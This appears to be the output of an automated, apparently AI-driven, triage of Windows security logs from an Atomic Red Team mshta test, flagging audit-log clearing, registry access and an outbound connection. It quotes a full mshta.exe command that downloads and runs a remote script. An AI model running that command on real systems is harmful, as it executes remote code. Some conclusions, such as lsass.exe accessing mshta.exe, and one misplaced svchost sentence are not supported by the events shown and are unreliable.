analysis.execution_summary: The logs reveal a high-severity attack involving mshta.exe executing a remote script, followed by attempts to modify registry settings related to Winlogon and Internet Settings, and subsequent network connections. The audit log was cleared, indicating an attempt to hide the attacker's activity. The presence of lsass.exe accessing mshta.exe is also a major concern.
analysis.agent_reasoning: The execution of a remote script via mshta.exe is a common initial access technique. The subsequent registry modifications targeting Winlogon and Internet Settings suggest attempts to establish persistence, disable security features, or redirect network traffic. The involvement of lsass.exe, which stores credential information, accessing mshta.exe is a strong indicator of credential theft. The clearing of the audit log confirms malicious intent to evade detection. The network connections to external IPs should also be investigated.

abnormal_events.event_description: The audit log was cleared. This action removes evidence of past events, making it difficult to track attacker activity.
abnormal_events.why_abnormal: Clearing the audit log is a definitive sign of malicious activity, indicating an attempt to hide the attacker's actions and evade detection. This event is highly suspicious and warrants immediate investigation.

abnormal_events.event_description: A new process has been created: C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
abnormal_events.why_abnormal: The process mshta.exe was launched with a command line argument to execute javascript code from a remote URL. This is a known technique for bypassing application control and executing malicious code. The URL points to a known Atomic Red Team test, but in a real attack, this would be a malicious payload.

tool_enrichment.decoded_command: The decoder tool was used, but the decoded text was not human-readable, indicating the presence of obfuscation.
tool_enrichment.timeline_context: Timeline analysis would show events before and after this process creation.

abnormal_events.event_description: A handle to an object was requested: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
abnormal_events.why_abnormal: The process mshta.exe is requesting a handle to the Winlogon registry key. This key is critical for controlling the Windows logon process. Unauthorized modifications to this key can lead to persistence, privilege escalation, or complete system compromise.

abnormal_events.event_description: An attempt was made to access an object: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
abnormal_events.why_abnormal: The process mshta.exe is attempting to access the Winlogon registry key. This key is critical for controlling the Windows logon process. Unauthorized modifications to this key can lead to persistence, privilege escalation, or complete system compromise.

abnormal_events.event_description: An attempt was made to duplicate a handle to an object. Target Process ID: 0x4 (System)
abnormal_events.why_abnormal: The process mshta.exe is attempting to duplicate a handle to an object belonging to the System process. Handle duplication to the System process is a technique often used to escalate privileges, potentially granting the attacker SYSTEM-level access.

abnormal_events.event_description: The handle to an object was closed.
abnormal_events.why_abnormal: The process mshta.exe is closing a handle to an object. This event often occurs after a handle has been used for malicious purposes.

abnormal_events.event_description: A privileged service was called. Process Name: C:\Windows\System32\RuntimeBroker.exe, Privileges: SeTcbPrivilege
abnormal_events.why_abnormal: RuntimeBroker.exe calling a privileged service with SeTcbPrivilege is highly unusual. SeTcbPrivilege is a very powerful privilege that allows a process to act as part of the operating system. This is a strong indicator of privilege escalation or an attempt to inject code into a protected process.

abnormal_events.event_description: The Windows Filtering Platform has permitted a connection. Application Name: \device\harddiskvolume2\windows\system32\mshta.exe, Destination Address: 151.101.248.133, Destination Port: 443
abnormal_events.why_abnormal: mshta.exe making an outbound connection to a remote IP address on port 443 (HTTPS) after the suspicious script execution is highly suspicious. This could indicate command and control (C2) communication or data exfiltration.
svchost.exe accessing InputApp_cw5n1h2txyewy is unusual. This could indicate an attempt to inject code into a protected process or monitor user input, potentially to capture sensitive information.

abnormal_events.event_description: A handle to an object was requested: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Internet Settings\ZoneMap
abnormal_events.why_abnormal: The process mshta.exe is requesting a handle to the Internet Settings ZoneMap registry key. This key controls security zones in Internet Explorer and Edge. Modifying this key can allow an attacker to bypass security restrictions or redirect network traffic.
